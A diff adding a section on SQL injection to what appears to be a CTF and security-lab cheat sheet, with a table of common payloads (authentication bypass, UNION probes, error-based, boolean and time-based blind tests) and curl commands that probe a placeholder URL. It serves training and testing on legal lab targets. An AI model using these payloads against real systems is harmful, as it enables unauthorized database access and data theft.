@@ -101,6 +101,31 @@ the terminal:
 | `curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1%27" \| head -n 20` | SQL-related error text can indicate injectable input         |
 | `sqlmap --version`                                                             | installed version string                                     |
 
+### Common SQL injection patterns (CTF labs only)
+
+Use these for legal CTF targets and training apps (DVWA, bWAPP, PortSwigger
+labs), never against systems you do not own or have explicit permission to test.
+
+| Pattern                        | Example payload                                       | What it checks                           |
+| ------------------------------ | ----------------------------------------------------- | ---------------------------------------- |
+| Quote break                    | `'`                                                   | whether input reaches SQL unsafely       |
+| Always-true auth bypass        | `' OR '1'='1' -- -`                                   | weak login checks / string concatenation |
+| Comment tail                   | `-- -` or `#`                                         | truncates the rest of the SQL query      |
+| UNION column count probe       | `' ORDER BY 1 -- -` (increase n)                      | number of selected columns               |
+| UNION data exfil (text output) | `' UNION SELECT NULL,NULL -- -`                       | reflected data from another SELECT       |
+| Error-based fingerprint        | `' and extractvalue(1,concat(0x7e,user(),0x7e)) -- -` | DB error messages leaking info           |
+| Boolean blind test             | `' AND 1=1 -- -` / `' AND 1=2 -- -`                   | response difference without errors       |
+| Time-based blind test          | `' OR IF(1=1,SLEEP(5),0) -- -`                        | measurable delay when true               |
+
+Quick terminal probes:
+
+| Command                                                                  | Expected output                             |
+| ------------------------------------------------------------------------ | ------------------------------------------- |
+| `curl -s "URL?id=1%27" \| head`                                          | possible SQL error text or changed response |
+| `curl -s "URL?id=1%27%20AND%201=1--%20-" \| wc -c`                       | baseline response length                    |
+| `curl -s "URL?id=1%27%20AND%201=2--%20-" \| wc -c`                       | different length can indicate blind SQLi    |
+| `time curl -s "URL?id=1%27%20OR%20IF(1=1,SLEEP(5),0)--%20-" > /dev/null` | delayed response suggests time-based SQLi   |
+
 ---
 
 ## 6. Steganography
